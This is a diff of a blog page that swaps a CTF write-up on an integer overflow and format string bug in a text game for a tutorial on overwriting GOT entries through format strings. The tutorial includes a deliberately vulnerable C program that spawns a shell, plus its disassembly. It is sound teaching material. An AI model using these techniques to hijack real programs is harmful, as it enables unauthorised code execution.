@@ -11,7 +11,7 @@
 
   <title>
     
-      Mining Hero Vulnerabilities &middot; Nihaal Prasad
+      GOT Overwrite Using Format Strings &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 
     <main class="container">
       <div class="content">
-  <h1 class="page-heading">Mining Hero Vulnerabilities</h1>
+  <h1 class="page-heading">GOT Overwrite Using Format Strings</h1>
   <div class="post-meta">
   <span class="post-categories">
     
@@ -193,420 +193,281 @@
 
   <hr>
   <div class="post-body">
-    <p><a href="../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game.cpp">Mining Hero</a> (click <a href="../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game">here</a> for the binary) is a CTF problem I solved when I played in MetaCTF over this weekend. It involves chaining an integer overflow vulnerability with a format string vulnerability in order to obtain the flag. This is my writeup for how I exploited the binary.</p>
+    <p>The Global Offset Table (GOT) is a table of memory addresses, and the location of the GOT is always known at runtime. Typically, the GOT is used to store the address of various functions in libraries that are loaded into the program. Because of PIE, libraries will be relocated at runtime, so the only way for a running process to know the location of a certain library function is by looking it up inside of the GOT.</p>
 
-<p>When I compiled the binary, <code class="highlighter-rouge">g++</code> immediately told me that there was a format string vulnerability in the code. This information will become useful later.</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>g++ <span class="nt">-fno-stack-protector</span> <span class="nt">-g</span> <span class="nt">-Wall</span> <span class="nt">-o</span> text-game text-game.cpp
-text-game.cpp: In <span class="k">function</span> ‘void purchase<span class="o">()</span>’:
-text-game.cpp:150:34: warning: operation on ‘tools_left’ may be undefined <span class="o">[</span><span class="nt">-Wsequence-point</span><span class="o">]</span>
-  150 |    &lt;&lt; <span class="s2">"now have "</span> &lt;&lt; <span class="o">(</span>tools_left +<span class="o">=</span> count - 1<span class="o">)</span> &lt;&lt; <span class="s2">" spare tool"</span>
-      |                      ~~~~~~~~~~~~^~~~~~~~~~~~~
-text-game.cpp:161:41: warning: suggest parentheses around comparison <span class="k">in </span>operand of ‘&amp;’ <span class="o">[</span><span class="nt">-Wparentheses</span><span class="o">]</span>
-  161 |   bool god_is_happy <span class="o">=</span> rand<span class="o">()</span> &amp; 0xFFFFFF <span class="o">==</span> 0<span class="p">;</span>
-      |                                ~~~~~~~~~^~~~
-text-game.cpp:164:22: warning: format not a string literal and no format arguments <span class="o">[</span><span class="nt">-Wformat-security</span><span class="o">]</span>
-  164 |   <span class="nb">printf</span><span class="o">(</span>name.c_str<span class="o">())</span><span class="p">;</span>
-</code></pre></div></div>
-
-<p>When I first played the game, I was given four different options.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./text-game 
-Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
-Before we continue, what is your name?
-Nihaal
-Current funds: $150
-Your options are: 
-1: Place a bet on a coin flip for a chance to double your money
-2: Go mining to earn some money
-3: Buy things
-4: Quit (Your money will not be saved)
-Please enter a number 1-4 to continue...
-</code></pre></div></div>
-
-<p>Selecting option two is the only reliable way to make more money. The downside to using this option is that it pauses the program for a moment (by calling the <code class="highlighter-rouge">usleep()</code> function), making it difficult to brute-force the program using only this option.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2
-You go to work in the mines
-[..........]
-[=.........]
-[==........]
-[===.......]
-[====......]
-[=====.....]
-[======....]
-[=======...]
-[========..]
-[=========.]
-[==========]
-It was a normal days work. You earned $7. Your balance is now $157.
-Current funds: $157
-Your options are:
-1: Place a bet on a coin flip for a chance to double your money
-2: Go mining to earn some money
-3: Buy things
-4: Quit (Your money will not be saved)
-Please enter a number 1-4 to continue...
-</code></pre></div></div>
-
-<p>Option one gives you a chance to double your money.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1
-A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
-heads
-How much would you like to bet that the coin will come up heads? Enter a number between 1 and 157.
-157
-... and the coin came up heads!! You just got $157! Congratulations! Your balance is $314
-Current funds: $314
-Your options are: 
-1: Place a bet on a coin flip for a chance to double your money
-2: Go mining to earn some money
-3: Buy things
-4: Quit (Your money will not be saved)
-Please enter a number 1-4 to continue...
-</code></pre></div></div>
-
-<p>Option three is interesting. It allows us to buy various things that could either allow us to mine things faster (encouragement) or get more money while mining (tools). It also includes a <code class="highlighter-rouge">shout-out-from-literally-god</code> option, which costs a huge sum of money.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3
-What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
-encouragement
-How many would you like to buy? Must be greater than 0
-1
-You can do it! Go you!
-You are now very encouraged! Your mining speed has increased.
-Current funds: $294
-Your options are:
-1: Place a bet on a coin flip for a chance to double your money
-2: Go mining to earn some money
-3: Buy things
-4: Quit (Your money will not be saved)
-Please enter a number 1-4 to continue...
-</code></pre></div></div>
-
-<p>Looking at the <code class="highlighter-rouge">purchase()</code> function in the code, it appears that our goal is to somehow buy the <code class="highlighter-rouge">shout-out-from-literally-god</code> option. However, even if we buy this option, there is still no guarantee that we will get the flag. The function only prints out the flag if <code class="highlighter-rouge">rand() &amp; 0xFFFFFF</code> equals zero, and since there is no way for us to actually control the output of <code class="highlighter-rouge">rand()</code>, there is no way for us to guarantee that we get the flag even after getting a shout out from god.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[...]</span>
-
-<span class="kt">void</span> <span class="n">purchase</span><span class="p">(){</span>
-
-    <span class="p">[...]</span>
-
-	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="s">"shout-out-from-literally-god"</span><span class="p">){</span>
-		<span class="n">bool</span> <span class="n">god_is_happy</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFF</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
-		<span class="n">bool</span><span class="o">*</span> <span class="n">god_is_really_happy</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">god_is_happy</span><span class="p">;</span>
-		<span class="n">printf</span><span class="p">(</span><span class="s">"Hmmmm</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-		<span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
-		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">You have done well!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-		<span class="n">printf</span><span class="p">(</span><span class="s">"Good job!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-
-		<span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">god_is_really_happy</span><span class="p">){</span>
-			<span class="n">printf</span><span class="p">(</span><span class="s">"I'm feeling generous right now!</span><span class="se">\n</span><span class="s">Have a flag!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-			<span class="n">std</span><span class="o">::</span><span class="n">ifstream</span> <span class="n">t</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">);</span>
-			<span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">str</span><span class="p">((</span><span class="n">std</span><span class="o">::</span><span class="n">istreambuf_iterator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">(</span><span class="n">t</span><span class="p">)),</span>
-				                 <span class="n">std</span><span class="o">::</span><span class="n">istreambuf_iterator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">());</span>
-			<span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">str</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
-		<span class="p">}</span>
-
-		<span class="n">printf</span><span class="p">(</span><span class="s">"Sincerely,</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">~God</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-
-<span class="p">[...]</span>
-</code></pre></div></div>
-
-<p>When looking at this block of code, one thing that I thought was strange was that the programmer made a function pointer called <code class="highlighter-rouge">bool* god_is_really_happy</code>. The first question that popped into my mind was, “What was the point of making this pointer?” It seems pretty much useless since the programmer could have just used <code class="highlighter-rouge">god_is_happy</code> in place of <code class="highlighter-rouge">*god_is_really_happy</code> in the if statement.</p>
-
-<p>My question was answered when I looked a little bit further down and remembered the format string vulnerability. The line that says <code class="highlighter-rouge">printf(name.c_str())</code> prints out our name directly using <code class="highlighter-rouge">printf()</code> instead of using a format string (The secure way of doing this would be to use <code class="highlighter-rouge">printf("%s", name.c_str())</code>). We could exploit the format string vulnerability by putting string formatters in <code class="highlighter-rouge">name</code>.</p>
-
-<p>At this point in time, we have two goals:</p>
+<p>The Procedure Linkage Table (PLT) contains entries for every external library function in the program. The PLT entry for a function contains some executable code that essentially looks up the address of the function inside of the GOT and jumps to that address. If this is the first time that the function has been called, then the GOT entry will simply point to some code that will figure out the real address of the function. The second time that the function gets called, the GOT entry should point to the real address of the function. This can be summed up in the following steps:</p>
 <ol>
-  <li>Find a vulnerability that allows us to buy the <code class="highlighter-rouge">shout-out-from-literally-god</code> option.</li>
-  <li>Exploit the format string vulnerability to write anything (other than zero) to the address <code class="highlighter-rouge">god_is_really_happy</code>.</li>
+  <li>The program wants to call some function <code class="highlighter-rouge">x()</code>, which is located in an external library.</li>
+  <li>The program first jumps to <code class="highlighter-rouge">x@plt</code>, which is the PLT entry for <code class="highlighter-rouge">x()</code>.</li>
+  <li>The code at <code class="highlighter-rouge">x@plt</code> jumps to the function pointer stored at the GOT entry for <code class="highlighter-rouge">x()</code>. The GOT entry for <code class="highlighter-rouge">x()</code> is written as <code class="highlighter-rouge">x@got.plt</code>.</li>
+  <li>If this is the first time that <code class="highlighter-rouge">x()</code> has been called:
+    <ul>
+      <li><code class="highlighter-rouge">x@got.plt</code> will simply jump to the line of code that comes right after <code class="highlighter-rouge">x@plt</code>.</li>
+      <li>The code that comes right after <code class="highlighter-rouge">x@plt</code> will call a function that will figure out the actual address of <code class="highlighter-rouge">x()</code>.</li>
+      <li>After the address is found, <code class="highlighter-rouge">x@got.plt</code> will be replaced with a pointer to the address of <code class="highlighter-rouge">x()</code>.</li>
+    </ul>
+  </li>
 </ol>
 
-<p>Instead of doing step one, you could also try to brute-force the program until you got enough money, but I didn’t go with that solution.</p>
-
-<p>The first vulnerability took me a long time to see. I manually inputted various characters when the program asked for a specific type of input, and I was specifically looking for integer overflow vulnerabilities that increased my money (though, I would later find out that increasing my money was not necessary). Typing -1 when betting did not work.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Current funds: $150
-Your options are:
-1: Place a bet on a coin flip for a chance to double your money
-2: Go mining to earn some money
-3: Buy things
-4: Quit (Your money will not be saved)
-Please enter a number 1-4 to continue...
-1
-A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
-heads
-How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
--1
-How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
--1
-How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
+<p>Below is an example of how this looks like in assembly. This example was copied straight from a program opened up in GDB, and it is paused right before it makes a call to the <code class="highlighter-rouge">exit()</code> function.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x5655628d &lt;main+153&gt;       call   0x56556060 &lt;exit@plt&gt;
+   ↳  0x56556060 &lt;exit@plt+0&gt;     jmp    DWORD PTR [ebx+0x18]
+      0x56556066 &lt;exit@plt+6&gt;     push   0x18
+      0x5655606b &lt;exit@plt+11&gt;    jmp    0x56556020
 </code></pre></div></div>
+<p>In this example, <code class="highlighter-rouge">RIP</code> is currently pointing to <code class="highlighter-rouge">0x5655628d</code>. The function wants to call <code class="highlighter-rouge">exit()</code>, and in order to do this, the function will make a jump to <code class="highlighter-rouge">exit@plt</code>, which is <code class="highlighter-rouge">0x56556060</code> in this example. <code class="highlighter-rouge">ebx+0x18</code> currently points to <code class="highlighter-rouge">x@got.plt</code>, so the code at <code class="highlighter-rouge">exit@plt+0</code> will dereference the function pointer at <code class="highlighter-rouge">x@got.plt</code> and jump to it.</p>
 
-<p>However, when I did the same thing while buying something, the program said that I didn’t have enough money to buy encouragement, even though I did. The only reasonable explanation for this behavior would be that it interprets the quantity as an unsigned integer, even though I am typing it as a signed integer.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3
-What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
-encouragement
-How many would you like to buy? Must be greater than 0
--1
-You don't have the money for that!
-</code></pre></div></div>
+<p>The first time that <code class="highlighter-rouge">exit()</code> is called, <code class="highlighter-rouge">x@got.plt</code> will be equal to <code class="highlighter-rouge">exit@plt+6</code>. In order to dynamically resolve the address of <code class="highlighter-rouge">exit()</code>, the code will jump to <code class="highlighter-rouge">0x56556020</code>, which contains code that will figure out the correct address of <code class="highlighter-rouge">exit()</code>. Technically, <code class="highlighter-rouge">exit()</code> can only be called once because it stops the program, but if it was possible to call <code class="highlighter-rouge">exit()</code> a second time, then the jump at <code class="highlighter-rouge">exit@plt+0</code> would directly jump to the address of <code class="highlighter-rouge">exit()</code> because it would have already resolved the address beforehand.</p>
 
-<p>I spent a few minutes trying out a bunch of different negative numbers to see if any of them would allow me to actually buy <code class="highlighter-rouge">encouragement</code>. Although I was unsuccessful by simply using trial-and-error, this was enough to pique my interest, so I decided to take another look at the code for purchasing items. In the top half of the <code class="highlighter-rouge">purchase()</code>, we can see exactly how the quantity is interpreted.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[...]</span>
+<p>If an attacker is able to modify the GOT entry for some function <code class="highlighter-rouge">x()</code>, the attacker can replace the function pointer at <code class="highlighter-rouge">x@got.plt</code> with a pointer to some malicious code. After the attacker has hijacked the GOT entry, the attacker’s malicious code will be executed instead of <code class="highlighter-rouge">x()</code> whenever the process calls <code class="highlighter-rouge">x()</code>. This happens because the process will always lookup the function pointer for <code class="highlighter-rouge">x()</code> using <code class="highlighter-rouge">x@got.plt</code> even if the GOT entry has been modified.</p>
 
-<span class="kt">void</span> <span class="n">purchase</span><span class="p">()</span> <span class="p">{</span>
-    <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="o">&gt;</span> <span class="n">prices</span><span class="p">{</span>
-        <span class="p">{</span> <span class="s">"tool"</span><span class="p">,</span> <span class="mi">100</span> <span class="p">},</span>
-        <span class="p">{</span> <span class="s">"encouragement"</span><span class="p">,</span> <span class="mi">20</span> <span class="p">},</span>
-        <span class="p">{</span> <span class="s">"shout-out-from-literally-god"</span><span class="p">,</span> <span class="mi">1000000000000000ULL</span> <span class="p">}</span>
-    <span class="p">};</span>
+<p>Relocation Read-Only (RELRO) is an exploit mitigation technology that marks some sections of a binary as read-only. Nearly all executables have partial RELRO enabled, which will cause the GOT to come before the BSS section in memory. This mitigates against buffer overflows on GOT entries, but it still makes it possible to modify the GOT entry if the attacker can write to arbitrary memory. Full RELRO will make the program resolve all symbols at startup, and afterwards, it marks the GOT as read-only. As a result, full RELRO completely mitigates against all GOT overwrite vulnerabilities. However, full RELRO is not used as often in programs because it delays a program’s startup time.</p>
 
-    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">option</span><span class="p">{};</span>
-    <span class="k">do</span> <span class="p">{</span>
-        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"What would you like to buy? Options are "</span><span class="p">;</span>
-        <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">prices</span><span class="p">){</span>
-            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">entry</span><span class="p">.</span><span class="n">first</span> <span class="o">&lt;&lt;</span> <span class="s">" (cost: "</span> <span class="o">&lt;&lt;</span> <span class="n">entry</span><span class="p">.</span><span class="n">second</span> <span class="o">&lt;&lt;</span> <span class="s">"), "</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"or cancel"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
-        <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">option</span><span class="p">;</span>
-        <span class="k">if</span><span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="s">"cancel"</span><span class="p">){</span>
-            <span class="k">return</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="n">prices</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="o">==</span> <span class="n">prices</span><span class="p">.</span><span class="n">end</span><span class="p">());</span>
+<p>The below program contains a format string vulnerability. In normal circumstances, an attacker could use the format string vulnerability to overwrite the return value and jump to the <code class="highlighter-rouge">win()</code> function. However, in this example, the program calls <code class="highlighter-rouge">exit()</code> before it stops, and this means that even if an attacker overwrites the return value, the program will stop before it executes the <code class="highlighter-rouge">ret</code> instruction at the end of the function.</p>
 
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">count</span><span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
-    <span class="k">do</span> <span class="p">{</span>
-        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"How many would you like to buy? Must be greater than 0"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
-        <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">count</span><span class="p">;</span>
-    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">std</span><span class="o">::</span><span class="n">cin</span><span class="p">.</span><span class="n">good</span><span class="p">()</span> <span class="o">||</span> <span class="o">!</span><span class="n">count</span><span class="p">);</span>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="c1">// Compilation: gcc -o got -m32 got.c</span>
 
-    <span class="k">auto</span> <span class="n">item_cost</span><span class="p">{</span> <span class="n">prices</span><span class="p">.</span><span class="n">at</span><span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="p">};</span>
-    <span class="k">auto</span> <span class="n">total</span><span class="p">{</span> <span class="n">item_cost</span> <span class="o">*</span> <span class="n">count</span> <span class="p">};</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">total</span> <span class="o">&gt;</span> <span class="n">player_funds</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"You don't have the money for that!"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
-        <span class="k">return</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">player_funds</span> <span class="o">-=</span> <span class="n">total</span><span class="p">;</span>
-
-    <span class="p">[...]</span>
-
+<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
 <span class="p">}</span>
 
-<span class="p">[...]</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+    <span class="k">while</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"quit</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"q</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div></div>
 
-<p>There are four variables that we care about in this code. All four of these variables are stored as <code class="highlighter-rouge">unsigned long long</code>, which is 64 bits on my system.</p>
-<ul>
-  <li><code class="highlighter-rouge">player_funds</code> - Contains our money</li>
-  <li><code class="highlighter-rouge">item_cost</code> - The price of the thing we want to buy</li>
-  <li><code class="highlighter-rouge">count</code> - The quantity that we typed in</li>
-  <li><code class="highlighter-rouge">total</code> - Equal to <code class="highlighter-rouge">item_cost * count</code></li>
-</ul>
+<p>Instead of overwriting the return address, the attacker could overwrite the GOT entry for <code class="highlighter-rouge">exit()</code> using a format string vulnerability. If the GOT entry for <code class="highlighter-rouge">exit()</code> gets overwritten with the address of <code class="highlighter-rouge">win()</code>, then whenever <code class="highlighter-rouge">exit()</code> gets called, the program would jump to the <code class="highlighter-rouge">win()</code> function instead, giving the attacker a shell.</p>
 
-<p>What if we could input the value <code class="highlighter-rouge">count</code> such that <code class="highlighter-rouge">total</code> is something that is less than the actual price of <code class="highlighter-rouge">item</code>? This could allow us to buy items that we do not have enough money for. In other words, we want <code class="highlighter-rouge">count</code> to be a value such that <code class="highlighter-rouge">count * item_cost &lt; player_funds</code>. However, we cannot simply input 0 as count because the program checks for zeros.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3
-What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
-encouragement
-How many would you like to buy? Must be greater than 0
-0
-How many would you like to buy? Must be greater than 0
-0
-How many would you like to buy? Must be greater than 0
+<p>Here is what the main function looks like in assembly:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  disas main
+Dump of assembler code for function main:
+   0x565561f4 &lt;+0&gt;:     lea    ecx,[esp+0x4]
+   0x565561f8 &lt;+4&gt;:     and    esp,0xfffffff0
+   0x565561fb &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]
+   0x565561fe &lt;+10&gt;:    push   ebp
+   0x565561ff &lt;+11&gt;:    mov    ebp,esp
+   0x56556201 &lt;+13&gt;:    push   edi
+   0x56556202 &lt;+14&gt;:    push   esi
+   0x56556203 &lt;+15&gt;:    push   ebx
+   0x56556204 &lt;+16&gt;:    push   ecx
+   0x56556205 &lt;+17&gt;:    sub    esp,0x48
+   0x56556208 &lt;+20&gt;:    call   0x565560d0 &lt;__x86.get_pc_thunk.bx&gt;
+   0x5655620d &lt;+25&gt;:    add    ebx,0x2df3
+   0x56556213 &lt;+31&gt;:    jmp    0x5655623e &lt;main+74&gt;
+   0x56556215 &lt;+33&gt;:    mov    eax,DWORD PTR [ebx-0xc]
+   0x5655621b &lt;+39&gt;:    mov    eax,DWORD PTR [eax]
+   0x5655621d &lt;+41&gt;:    sub    esp,0x4
+   0x56556220 &lt;+44&gt;:    push   eax
+   0x56556221 &lt;+45&gt;:    push   0x32
+   0x56556223 &lt;+47&gt;:    lea    eax,[ebp-0x4a]
+   0x56556226 &lt;+50&gt;:    push   eax
+   0x56556227 &lt;+51&gt;:    call   0x56556040 &lt;fgets@plt&gt;
+   0x5655622c &lt;+56&gt;:    add    esp,0x10
+   0x5655622f &lt;+59&gt;:    sub    esp,0xc
+   0x56556232 &lt;+62&gt;:    lea    eax,[ebp-0x4a]
+   0x56556235 &lt;+65&gt;:    push   eax
+   0x56556236 &lt;+66&gt;:    call   0x56556030 &lt;printf@plt&gt;
+   0x5655623b &lt;+71&gt;:    add    esp,0x10
+   0x5655623e &lt;+74&gt;:    lea    eax,[ebp-0x4a]
+   0x56556241 &lt;+77&gt;:    mov    edx,eax
+   0x56556243 &lt;+79&gt;:    lea    eax,[ebx-0x1ff0]
+   0x56556249 &lt;+85&gt;:    mov    ecx,0x6
+   0x5655624e &lt;+90&gt;:    mov    esi,edx
+   0x56556250 &lt;+92&gt;:    mov    edi,eax
+   0x56556252 &lt;+94&gt;:    repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+   0x56556254 &lt;+96&gt;:    seta   al
+   0x56556257 &lt;+99&gt;:    setb   dl
+   0x5655625a &lt;+102&gt;:   sub    eax,edx
+   0x5655625c &lt;+104&gt;:   movsx  eax,al
+   0x5655625f &lt;+107&gt;:   test   eax,eax
+   0x56556261 &lt;+109&gt;:   je     0x56556288 &lt;main+148&gt;
+   0x56556263 &lt;+111&gt;:   lea    eax,[ebp-0x4a]
+   0x56556266 &lt;+114&gt;:   mov    edx,eax
+   0x56556268 &lt;+116&gt;:   lea    eax,[ebx-0x1fea]
+   0x5655626e &lt;+122&gt;:   mov    ecx,0x3
+   0x56556273 &lt;+127&gt;:   mov    esi,edx
+   0x56556275 &lt;+129&gt;:   mov    edi,eax
+   0x56556277 &lt;+131&gt;:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+   0x56556279 &lt;+133&gt;:   seta   al
+   0x5655627c &lt;+136&gt;:   setb   dl
+   0x5655627f &lt;+139&gt;:   sub    eax,edx
+   0x56556281 &lt;+141&gt;:   movsx  eax,al
+   0x56556284 &lt;+144&gt;:   test   eax,eax
+   0x56556286 &lt;+146&gt;:   jne    0x56556215 &lt;main+33&gt;
+   0x56556288 &lt;+148&gt;:   sub    esp,0xc
+   0x5655628b &lt;+151&gt;:   push   0x0
+=&gt; 0x5655628d &lt;+153&gt;:   call   0x56556060 &lt;exit@plt&gt;
+End of assembler dump.
 </code></pre></div></div>
 
-<p>We know that we can type in signed integers and have them be interpreted as unsigned integers, so what if we tried a value for <code class="highlighter-rouge">count</code> that was negative? In order to find such a value for <code class="highlighter-rouge">count</code>, I decided to use <code class="highlighter-rouge">z3</code>.</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Python</span> <span class="mf">3.8.5</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Jul</span> <span class="mi">28</span> <span class="mi">2020</span><span class="p">,</span> <span class="mi">12</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">40</span><span class="p">)</span>
-<span class="p">[</span><span class="n">GCC</span> <span class="mf">9.3.0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
-<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">total</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">'total'</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">player_funds</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">'player_funds'</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">item_cost</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">'item_cost'</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">count</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">'count'</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">solve</span><span class="p">(</span><span class="n">total</span> <span class="o">==</span> <span class="n">item_cost</span> <span class="o">*</span> <span class="n">count</span><span class="p">,</span> <span class="n">item_cost</span> <span class="o">==</span> <span class="mi">1000000000000000</span><span class="p">,</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ULE</span><span class="p">(</span><span class="n">total</span><span class="p">,</span> <span class="n">player_funds</span><span class="p">),</span> <span class="n">player_funds</span> <span class="o">==</span> <span class="mi">150</span><span class="p">)</span>
-<span class="p">[</span><span class="n">total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
